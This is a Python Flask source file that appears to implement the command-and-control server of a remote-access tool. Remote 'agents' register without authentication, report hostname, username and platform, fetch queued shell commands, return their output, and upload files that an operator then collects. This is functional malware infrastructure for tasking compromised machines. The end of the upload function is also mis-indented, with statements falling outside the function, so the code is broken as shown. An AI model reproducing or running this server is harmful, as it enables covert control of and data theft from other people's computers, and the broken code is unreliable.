import os
import sys
from pathlib import Path
# Add the project root to the Python path
sys.path.insert(0, str(Path(__file__).resolve().parents[2]))
from datetime import datetime
from flask import Blueprint

from flask import request
from flask import abort
from flask import url_for
from flask import render_template
from werkzeug.utils import secure_filename
from markupsafe import escape

from server.webui import require_admin
from server.models import Agent, Command, db


api = Blueprint('api', __name__)


# Dummy geolocation function since pygeoip is unavailable
def geolocation():
    # You can integrate with a free API like ipinfo.io or ip-api.com if needed
    # The '_ip' parameter was removed as it was unused.
    return 'Local'

@api.route('/<agent_id>/push', methods=['POST'])
@require_admin
def push_command(agent_id):
    agent = Agent.query.get(agent_id)
    if not agent:
        abort(404)
    agent.push_command(request.form['cmd'])
    return ''


@api.route('/<agent_id>/console')
@require_admin
def agent_console(agent_id):
    agent = Agent.query.get(agent_id)
    if not agent:
        abort(404)
    return render_template('agent_console.html', agent=agent)


@api.route('/<agent_id>/hello', methods=['POST'])
def get_command(agent_id):
    agent = Agent.query.get(agent_id)
    if not agent:
        agent = Agent(agent_id)
        db.session.add(agent)
        db.session.commit()
    # Report basic info about the agent
    info = request.json
    if info:
        if 'platform' in info:
            agent.operating_system = info['platform']
        if 'hostname' in info:
            agent.hostname = info['hostname']
        if 'username' in info:
            agent.username = info['username']
    agent.last_online = datetime.now()
    agent.remote_ip = request.remote_addr
    agent.geolocation = geolocation()
    db.session.commit()
    # Return pending commands for the agent
    cmd_to_run = ''
    cmd = agent.commands.order_by(Command.timestamp.desc()).first()
    if cmd:
        cmd_to_run = cmd.cmdline
        db.session.delete(cmd)
        db.session.commit()
    return cmd_to_run


@api.route('/<agent_id>/report', methods=['POST'])
def report_command(agent_id):
    agent = Agent.query.get(agent_id)
    if not agent:
        abort(404)
    out = request.form['output']
    agent.output += escape(out)
    db.session.add(agent)
    db.session.commit()
    return ''


@api.route('/<agent_id>/upload', methods=['POST'])
@require_admin
def upload_file(agent_id):
    agent = Agent.query.get(agent_id)
    if not agent:
        abort(404)
    if 'file' in request.files:
        file = request.files['file']
        filename = secure_filename(file.filename)
        agent_dir = agent.agent_id
        store_dir = os.path.join('webui/static/uploads', agent_dir)
        if not os.path.exists(store_dir):
            os.makedirs(store_dir)
        file_path = os.path.join(store_dir, filename)
    while os.path.exists(file_path):
        filename = "_" + filename
        file_path = os.path.join(store_dir, filename)
    file.save(file_path)
download_link = url_for('webui.uploads', path=agent_dir + '/' + filename)
agent.output += '[*] File uploaded: <a target="_blank" href="' + download_link + '">' + download_link + '</a>\n'
db.session.add(agent)
db.session.commit()
return ''
